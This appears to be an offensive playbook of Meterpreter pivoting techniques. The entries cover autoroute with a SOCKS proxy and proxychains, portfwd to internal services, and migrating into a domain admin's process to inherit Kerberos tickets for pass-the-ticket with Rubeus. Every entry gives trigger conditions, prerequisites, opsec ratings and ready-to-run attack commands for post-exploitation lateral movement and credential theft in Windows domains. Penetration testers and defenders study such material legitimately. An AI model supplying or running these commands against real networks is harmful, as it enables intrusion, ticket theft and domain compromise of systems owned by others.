# Meterpreter Pivoting Techniques

### Meterpreter autoroute + socks_proxy (MSF Internal Routing) [added: 2026-04]
- **Tags:** #Meterpreter #Autoroute #SOCKS #Pivoting #Metasploit #Proxychains #InternalNetwork
- **Trigger:** Active Meterpreter session on a host with internal network access; need to run tools (evil-winrm, cme, nmap) against internal hosts
- **Prereq:** Active Meterpreter session; Metasploit; proxychains on attacker; internal subnet known
- **Yields:** SOCKS4a proxy on 127.0.0.1:1080 routing all proxychains traffic through the Meterpreter session to the internal network
- **Opsec:** Med
- **Context:** MSF's built-in pivoting. autoroute adds a route through the session; socks_proxy exposes it as a local SOCKS listener. proxychains then routes any tool through it. Note: crackmapexec may not work reliably with proxychains — use evil-winrm or manual tool invocation instead.
- **Payload/Method:**
  ```
  # In meterpreter session
  run autoroute -s <INTERNAL_CIDR>
  # e.g.: run autoroute -s 192.168.210.0/24
  background

  # Start SOCKS proxy
  use auxiliary/server/socks_proxy
  set VERSION 4a
  set SRVPORT 1080
  run

  # Edit /etc/proxychains.conf:
  # strict_chain
  # proxy_dns
  # [ProxyList]
  # socks4  127.0.0.1  1080

  # Use tools via proxychains
  proxychains evil-winrm -i <INTERNAL_IP> -u user -p pass
  proxychains nmap -sT -Pn -p 445,5985 <INTERNAL_IP>

  # Note: For ping sweeps use MSF module instead:
  use post/multi/gather/ping_sweep
  set SESSION <N>
  set RHOSTS <CIDR>
  run
  ```

### Meterpreter portfwd — Single Port Forward to Internal Service [added: 2026-04]
- **Tags:** #Meterpreter #portfwd #PortForward #Pivoting #Metasploit #ServiceAccess #LocalForward
- **Trigger:** Active Meterpreter session; need to access a specific internal service (web app, RDP, Zabbix) directly in a browser or tool without proxychains
- **Prereq:** Active Meterpreter session; internal IP and port of target service known
- **Yields:** Local port on attacker machine forwarded to internal service — browser/tool access without proxychains
- **Opsec:** Low
- **Context:** Lighter than full SOCKS proxy when you only need access to one specific internal service (e.g., Zabbix web UI, RDP). Binds a local port on the attacker to the remote internal port through the Meterpreter session.
- **Payload/Method:**
  ```
  # In meterpreter session
  portfwd add -l <LOCAL_PORT> -p <REMOTE_PORT> -r <INTERNAL_IP>
  # e.g.: portfwd add -l 443 -p 443 -r 192.168.210.13

  # Then access directly:
  # https://127.0.0.1:443  (for HTTPS service)
  # xfreerdp /v:127.0.0.1 /u:user  (for RDP)

  # List active forwards
  portfwd list

  # Remove a forward
  portfwd delete -l <LOCAL_PORT>
  ```

### Process Migration to Inherit Active User Kerberos Tickets [added: 2026-04]
- **Tags:** #Meterpreter #ProcessMigration #KerberosTickets #TicketTheft #Pivoting #LateralMovement #CrossDomain #SessionHijack #TokenAbuse #T1134
- **Trigger:** Meterpreter shell obtained on a host where a high-privilege user (domain admin, enterprise admin) has an active interactive or service session
- **Prereq:** Active Meterpreter session; target host has privileged user with cached Kerberos tickets (interactive logon, active RDP, or running process); sufficient privileges to migrate (SYSTEM or same user)
- **Yields:** DA/EA Kerberos TGTs in memory — enables `klist` to show cached tickets usable for cross-domain/cross-forest lateral movement without knowing any password
- **Opsec:** Med
- **Context:** When a privileged user has an active session on a compromised machine, their Kerberos tickets live in the LSASS process space tied to their logon session. Migrating your Meterpreter to any process running under that user inherits the same logon session and its Kerberos ticket cache. This is distinct from token impersonation — you gain the actual Kerberos context, not just an access token. Critical use case: after compromising a child-domain DC, migrate to the domain admin's process to discover cached inter-realm tickets for the parent forest, enabling traversal without additional credential attacks.
- **Payload/Method:**
  ```
  # In Meterpreter session
  ps                                    # list processes — find ones owned by target DA/EA user
  migrate <PID>                         # migrate into their process
  shell
  klist                                 # should now show cached TGTs/TGSs for their logon session
  # Use tickets with Rubeus / Mimikatz for further movement
  # Rubeus: asktgs /ticket:<kirbi> /service:CIFS/<target> /dc:<DC> /ptt
  ```
